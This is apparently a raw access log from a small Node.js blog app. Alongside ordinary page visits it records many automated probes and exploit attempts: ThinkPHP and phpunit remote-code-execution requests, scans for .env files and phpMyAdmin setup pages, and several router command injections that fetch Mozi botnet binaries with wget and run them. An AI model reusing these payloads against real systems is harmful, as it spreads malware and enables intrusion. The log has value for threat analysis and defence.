[0mGET /.env [33m404 [0m0.770 ms - 893[0m
[0mPOST / [33m404 [0m1.000 ms - 893[0m
[0mGET / [32m200 [0m1.958 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.770 ms - 893[0m
[0mGET /.env [33m404 [0m0.807 ms - 893[0m
[0mPOST / [33m404 [0m0.946 ms - 893[0m
[0mGET /TP/public/index.php [33m404 [0m0.928 ms - 893[0m
[0mGET /TP/index.php [33m404 [0m0.894 ms - 893[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.864 ms - 893[0m
[0mGET /html/public/index.php [33m404 [0m0.877 ms - 893[0m
[0mGET /public/index.php [33m404 [0m0.880 ms - 893[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.913 ms - 893[0m
[0mGET /elrekt.php [33m404 [0m1.712 ms - 893[0m
[0mGET / [32m200 [0m0.920 ms - 859[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.918 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.745 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.811 ms - 893[0m
[0mGET / [32m200 [0m0.903 ms - 859[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.888 ms - 893[0m
[0mGET / [32m200 [0m0.868 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.884 ms - 893[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.906 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.844 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.905 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.761 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.772 ms - 893[0m
[0mGET /hudson [33m404 [0m0.918 ms - 893[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.735 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.744 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.750 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.756 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.756 ms - 893[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.779 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.779 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.754 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.810 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.797 ms - 893[0m
[0mGET /.env [33m404 [0m0.802 ms - 893[0m
[0mPOST / [33m404 [0m0.787 ms - 893[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.899 ms - 893[0m
[0mGET / [32m200 [0m0.909 ms - 859[0m
[0mGET /.env [33m404 [0m0.855 ms - 893[0m
[0mPOST / [33m404 [0m1.901 ms - 893[0m
[0mGET / [32m200 [0m0.880 ms - 859[0m
[0mGET /stylesheets/style.css [32m200 [0m1.700 ms - 111[0m
[0mGET /js/bootstrap.min.js [32m200 [0m2.119 ms - 60044[0m
[0mGET /css/bootstrap.min.css [32m200 [0m3.689 ms - 160302[0m
[0mGET /js/jquery.min.js [32m200 [0m4.571 ms - 89476[0m
[0mGET /favicon.ico [33m404 [0m0.890 ms - 893[0m
[0mGET / [32m200 [0m55.692 ms - 859[0m
(node:2050) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
(node:2050) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://localhost/blogger
[0mGET /blogs [36m304 [0m11.799 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.244 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.378 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.938 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.902 ms - -[0m
[0mGET / [36m304 [0m3.097 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.014 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.928 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.161 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.524 ms - -[0m
[0mGET /blogs [36m304 [0m1.569 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.438 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.179 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.178 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.423 ms - -[0m
[0mGET /blogs/add [36m304 [0m2.069 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.436 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.085 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.122 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.344 ms - -[0m
[0mGET /blogs [36m304 [0m1.246 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.161 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.070 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.838 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.439 ms - -[0m
[0mGET /blogs/edit [36m304 [0m1.357 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.922 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m3.574 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.864 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m4.006 ms - -[0m
[0mGET /blogs/delete [36m304 [0m1.423 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.657 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.544 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.730 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.712 ms - -[0m
[0mGET / [36m304 [0m1.241 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.380 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.466 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.565 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.453 ms - -[0m
[0mGET / [36m304 [0m1.093 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.429 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.482 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.574 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.470 ms - -[0m
[0mGET / [36m304 [0m1.032 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.453 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.455 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.516 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.414 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.191 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.431 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.307 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.269 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.364 ms - -[0m
[0mGET /blogs [36m304 [0m2.011 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.420 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.334 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.063 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.768 ms - -[0m
[0mGET /blogs/edit [36m304 [0m1.216 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.393 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.443 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.468 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.478 ms - -[0m
[0mGET /blogs [36m304 [0m1.136 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.371 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.394 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.158 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.835 ms - -[0m
[0mPOST /sns/message/receive [33m404 [0m2.852 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m1.366 ms - 1429[0m
[0mGET / [32m200 [0m0.976 ms - 859[0m
[0mGET /stylesheets/style.css [32m200 [0m2.892 ms - 111[0m
[0mGET /js/bootstrap.min.js [32m200 [0m2.141 ms - 60044[0m
[0mGET /js/jquery.min.js [32m200 [0m2.381 ms - 89476[0m
[0mGET /css/bootstrap.min.css [32m200 [0m2.127 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.007 ms - 1434[0m
[0mGET / [32m200 [0m0.991 ms - 859[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.715 ms - 160302[0m
[0mGET /blogs [32m200 [0m1.103 ms - 4319[0m
[0mGET /stylesheets/style.css [36m304 [0m0.462 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.076 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.085 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.220 ms - -[0m
[0mGET /js/bootstrap.min.js [32m200 [0m0.808 ms - 60044[0m
[0mPOST /sns/message/receive [33m404 [0m0.863 ms - 1429[0m
[0mGET /blogs/edit [32m200 [0m0.963 ms - 848[0m
[0mGET /stylesheets/style.css [36m304 [0m1.137 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m4.583 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.729 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.847 ms - -[0m
[0mGET /blogs [36m304 [0m1.131 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.342 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.989 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.018 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.036 ms - -[0m
[0mGET /blogs/delete [32m200 [0m1.145 ms - 854[0m
[0mGET /stylesheets/style.css [36m304 [0m0.445 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.140 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.172 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.208 ms - -[0m
[0mGET /blogs/add [32m200 [0m0.906 ms - 846[0m
[0mGET /stylesheets/style.css [36m304 [0m0.384 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.293 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.274 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.397 ms - -[0m
[0mGET / [36m304 [0m0.950 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.482 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.380 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.600 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.449 ms - -[0m
[0mGET / [36m304 [0m0.977 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.677 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.790 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.838 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.956 ms - -[0m
[0mGET / [36m304 [0m0.931 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.745 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.848 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.571 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.297 ms - -[0m
[0mGET / [32m200 [0m1.003 ms - 859[0m
[0mGET / [32m200 [0m0.987 ms - 859[0m
[0mGET /favicon.ico [33m404 [0m1.592 ms - 1434[0m
[0mGET /stylesheets/style.css [32m200 [0m2.143 ms - 111[0m
[0mGET /js/bootstrap.min.js [32m200 [0m2.964 ms - 60044[0m
[0mGET /js/jquery.min.js [32m200 [0m4.057 ms - 89476[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.590 ms - 160302[0m
[0mGET /TP/public/index.php [33m404 [0m0.961 ms - 1434[0m
[0mGET /TP/index.php [33m404 [0m1.148 ms - 1434[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m1.010 ms - 1434[0m
[0mGET /html/public/index.php [33m404 [0m0.942 ms - 1434[0m
[0mGET /public/index.php [33m404 [0m0.968 ms - 1434[0m
[0mGET /TP/html/public/index.php [33m404 [0m1.008 ms - 1434[0m
[0mGET /elrekt.php [33m404 [0m0.981 ms - 1434[0m
[0mGET /index.php [33m404 [0m1.026 ms - 1434[0m
[0mGET / [32m200 [0m0.993 ms - 859[0m
[0mPOST /HNAP1/ [33m404 [0m1.537 ms - 1429[0m
[0mGET / [32m200 [0m0.927 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.975 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.964 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.961 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.948 ms - 1434[0m
[0mPOST /api/jsonws/invoke [33m404 [0m25.772 ms - 1429[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.986 ms - 1434[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.493 ms - 1429[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.988 ms - 1434[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.973 ms - 1434[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.933 ms - 1434[0m
[0mGET /pma/scripts/setup.php [33m404 [0m1.571 ms - 1434[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m0.980 ms - 1434[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.902 ms - 1434[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.217.136.148:52002/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.070 ms - 1434[0m
[0mGET /TP/public/index.php [33m404 [0m0.931 ms - 1434[0m
[0mGET /TP/index.php [33m404 [0m0.958 ms - 1434[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.984 ms - 1434[0m
[0mGET /html/public/index.php [33m404 [0m0.983 ms - 1434[0m
[0mGET / [32m200 [0m0.956 ms - 859[0m
[0mGET /TP/public/index.php [33m404 [0m0.917 ms - 1434[0m
[0mGET /TP/index.php [33m404 [0m1.033 ms - 1434[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.930 ms - 1434[0m
[0mGET /html/public/index.php [33m404 [0m0.967 ms - 1434[0m
[0mGET /public/index.php [33m404 [0m1.515 ms - 1434[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.932 ms - 1434[0m
[0mGET /elrekt.php [33m404 [0m0.953 ms - 1434[0m
[0mGET /index.php [33m404 [0m0.941 ms - 1434[0m
[0mGET / [32m200 [0m0.919 ms - 859[0m
[0mGET / [32m200 [0m0.950 ms - 859[0m
[0mGET /manager/html [33m404 [0m1.610 ms - 1434[0m
[0mGET / [32m200 [0m1.610 ms - 859[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.56.109.134:57270/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.969 ms - 1434[0m
[0mGET /.env [33m404 [0m0.858 ms - 1434[0m
[0mPOST / [33m404 [0m2.178 ms - 1429[0m
[0mGET /.env [33m404 [0m0.894 ms - 1434[0m
[0mPOST / [33m404 [0m0.999 ms - 1429[0m
[0mGET / [32m200 [0m0.989 ms - 859[0m
[0mGET http://5.188.210.227/echo.php [33m404 [0m1.475 ms - 1434[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.956 ms - 1434[0m
[0mGET /ReportServer [33m404 [0m0.925 ms - 1434[0m
[0mGET /portal/redlion [33m404 [0m1.542 ms - 1434[0m
[0mGET / [32m200 [0m0.912 ms - 859[0m
[0mGET / [32m200 [0m0.911 ms - 859[0m
[0mGET / [32m200 [0m0.959 ms - 859[0m
[0mGET / [32m200 [0m0.813 ms - 859[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.967 ms - 1434[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.930 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.926 ms - 1429[0m
[0mGET / [32m200 [0m1.616 ms - 859[0m
[0mGET / [32m200 [0m0.776 ms - 859[0m
[0mGET / [32m200 [0m1.049 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.845 ms - 1429[0m
[0mGET /.env [33m404 [0m0.884 ms - 1434[0m
[0mPOST / [33m404 [0m1.524 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.810 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.875 ms - 1429[0m
[0mGET / [32m200 [0m1.033 ms - 859[0m
[0mGET / [32m200 [0m0.920 ms - 859[0m
[0mGET / [32m200 [0m2.138 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.871 ms - 1429[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.928 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.844 ms - 1429[0m
[0mGET / [32m200 [0m0.967 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.848 ms - 1429[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.969 ms - 1434[0m
[0mGET / [32m200 [0m0.982 ms - 859[0m
[0mGET / [32m200 [0m1.532 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.857 ms - 1429[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.977 ms - 859[0m
[0mHEAD / [32m200 [0m0.932 ms - 859[0m
[0mGET / [32m200 [0m0.951 ms - 859[0m
[0mGET / [32m200 [0m0.905 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m7.490 ms - 1429[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.951 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m1.563 ms - 1429[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.902 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.849 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.810 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.823 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.795 ms - 1429[0m
[0mPOST /HNAP1/ [33m404 [0m0.829 ms - 1429[0m
[0mGET / [32m200 [0m0.968 ms - 859[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.933 ms - 1429[0m
[0mGET / [32m200 [0m0.924 ms - 859[0m
[0mGET / [32m200 [0m0.926 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.824 ms - 1429[0m
[0mGET /.env [33m404 [0m0.881 ms - 1434[0m
[0mPOST / [33m404 [0m0.897 ms - 1429[0m
[0mGET / [32m200 [0m0.893 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.807 ms - 1429[0m
[0mGET /boaform/admin/formLogin?username=admin&psd=admin [33m404 [0m1.007 ms - 1434[0m
[0mGET / [32m200 [0m0.905 ms - 859[0m
[0mHEAD / [32m200 [0m0.897 ms - 859[0m
[0mGET / [32m200 [0m0.930 ms - 859[0m
[0mGET /hudson [33m404 [0m0.955 ms - 1434[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.930 ms - 1434[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.041 ms - 1434[0m
[0mGET /.git/config [33m404 [0m0.970 ms - 1434[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.916 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.900 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.969 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.967 ms - 1434[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.969 ms - 1429[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.997 ms - 1434[0m
[0mGET / [32m200 [0m0.953 ms - 859[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.999 ms - 1429[0m
[0mGET / [32m200 [0m0.978 ms - 859[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://39.73.203.200:57971/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.052 ms - 1434[0m
[0mGET / [32m200 [0m0.995 ms - 859[0m
[0mGET / [32m200 [0m0.943 ms - 859[0m
[0mGET / [32m200 [0m1.023 ms - 859[0m
[0mGET / [32m200 [0m0.955 ms - 859[0m
[0mGET / [32m200 [0m0.750 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.828 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.801 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.760 ms - 1429[0m
[0mGET / [32m200 [0m0.892 ms - 859[0m
[0mGET /boaform/admin/formLogin [33m404 [0m0.936 ms - 1434[0m
[0mGET / [32m200 [0m0.943 ms - 859[0m
[0mGET / [32m200 [0m3.363 ms - 859[0m
[0mGET / [32m200 [0m0.893 ms - 859[0m
[0mGET /muieblackcat [33m404 [0m0.952 ms - 1434[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.811 ms - 1434[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.866 ms - 1434[0m
[0mGET //pHpMyAdMiN/scripts/setup.php [33m404 [0m0.938 ms - 1434[0m
[0mGET //admin/scripts/setup.php [33m404 [0m0.947 ms - 1434[0m
[0mGET //db/scripts/setup.php [33m404 [0m0.909 ms - 1434[0m
[0mGET //dbadmin/scripts/setup.php [33m404 [0m0.764 ms - 1434[0m
[0mGET //mysql-admin/scripts/setup.php [33m404 [0m6.054 ms - 1434[0m
[0mGET //mysql/scripts/setup.php [33m404 [0m0.844 ms - 1434[0m
[0mGET //mysqladmin/scripts/setup.php [33m404 [0m0.963 ms - 1434[0m
[0mGET //mysqlmanager/scripts/setup.php [33m404 [0m0.946 ms - 1434[0m
[0mGET //noxdir/nosuichfile.php [33m404 [0m0.972 ms - 1434[0m
[0mGET //nosuichfile.php [33m404 [0m0.974 ms - 1434[0m
[0mGET //php-my-admin/scripts/setup.php [33m404 [0m0.924 ms - 1434[0m
[0mGET //php-myadmin/scripts/setup.php [33m404 [0m0.797 ms - 1434[0m
[0mGET //phpMyA/scripts/setup.php [33m404 [0m0.963 ms - 1434[0m
[0mGET //phpMyAdmi/scripts/setup.php [33m404 [0m0.937 ms - 1434[0m
[0mGET //phpMyAdmin-3/scripts/setup.php [33m404 [0m0.999 ms - 1434[0m
[0mGET //phpMyAdmin-4/scripts/setup.php [33m404 [0m1.651 ms - 1434[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.849 ms - 1434[0m
[0mGET //phpMyAdmin1/scripts/setup.php [33m404 [0m0.771 ms - 1434[0m
[0mGET //phpMyAdmin2/scripts/setup.php [33m404 [0m0.744 ms - 1434[0m
[0mGET //phpMyAds/scripts/setup.php [33m404 [0m0.792 ms - 1434[0m
[0mGET //phpm/scripts/setup.php [33m404 [0m0.823 ms - 1434[0m
[0mGET //phpmanager/scripts/setup.php [33m404 [0m1.076 ms - 1434[0m
[0mGET //phpmy-admin/scripts/setup.php [33m404 [0m0.860 ms - 1434[0m
[0mGET //phpmy/scripts/setup.php [33m404 [0m0.904 ms - 1434[0m
[0mGET //phpmyad-sys/scripts/setup.php [33m404 [0m1.695 ms - 1434[0m
[0mGET //phpmyad/scripts/setup.php [33m404 [0m0.939 ms - 1434[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.873 ms - 1434[0m
[0mGET //phpmyadmin2/scripts/setup.php [33m404 [0m0.743 ms - 1434[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.754 ms - 1434[0m
[0mGET //pma2005/scripts/setup.php [33m404 [0m0.833 ms - 1434[0m
[0mGET //scripts/setup.php [33m404 [0m0.757 ms - 1434[0m
[0mGET //sqladmin/scripts/setup.php [33m404 [0m0.790 ms - 1434[0m
[0mGET //sqlmanager/scripts/setup.php [33m404 [0m0.827 ms - 1434[0m
[0mGET //sqlweb/scripts/setup.php [33m404 [0m0.857 ms - 1434[0m
[0mGET //vhcs2/tools/pma/scripts/setup.php [33m404 [0m1.472 ms - 1434[0m
[0mGET //web/phpMyAdmin/scripts/setup.php [33m404 [0m0.755 ms - 1434[0m
[0mGET //webadmin/scripts/setup.php [33m404 [0m0.763 ms - 1434[0m
[0mGET //webdb/scripts/setup.php [33m404 [0m0.719 ms - 1434[0m
[0mGET //websql/scripts/setup.php [33m404 [0m0.703 ms - 1434[0m
[0mGET http://163.172.88.110:41298/1 [33m404 [0m0.971 ms - 1434[0m
[0mGET http://163.172.88.110:41298/1 [33m404 [0m1.004 ms - 1434[0m
[0mGET http://163.172.88.110:41298/1 [33m404 [0m0.992 ms - 1434[0m
[0mGET /.env [33m404 [0m0.882 ms - 1434[0m
[0mPOST / [33m404 [0m1.042 ms - 1429[0m
[0mGET / [32m200 [0m0.896 ms - 859[0m
[0mGET / [32m200 [0m0.929 ms - 859[0m
[0mGET / [32m200 [0m0.897 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.799 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.795 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.885 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m1.569 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.830 ms - 1429[0m
[0mGET / [32m200 [0m1.002 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.812 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m1.415 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.834 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.808 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.783 ms - 1429[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.987 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.887 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.887 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.675 ms - 1434[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.962 ms - 1429[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.996 ms - 1434[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.107 ms - 1429[0m
[0mGET / [32m200 [0m0.917 ms - 859[0m
[0mGET / [32m200 [0m0.686 ms - 859[0m
[0mGET / [32m200 [0m1.046 ms - 859[0m
[0mGET / [32m200 [0m0.717 ms - 859[0m
[0mGET / [32m200 [0m0.996 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.814 ms - 1429[0m
[0mGET / [32m200 [0m0.904 ms - 859[0m
[0mGET / [32m200 [0m0.936 ms - 859[0m
[0mOPTIONS / [32m200 [0m0.603 ms - 8[0m
[0mGET / [32m200 [0m1.404 ms - 859[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.582 ms - 1434[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://42.224.79.81:48918/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.966 ms - 1434[0m
[0mGET / [32m200 [0m0.908 ms - 859[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.785 ms - 1429[0m
[0mGET / [32m200 [0m0.936 ms - 859[0m
[0mGET /hudson [33m404 [0m1.336 ms - 1434[0m
[0mGET / [32m200 [0m1.661 ms - 859[0m
[0mGET / [32m200 [0m0.901 ms - 859[0m
[0mGET /connector.sds [33m404 [0m0.924 ms - 1434[0m
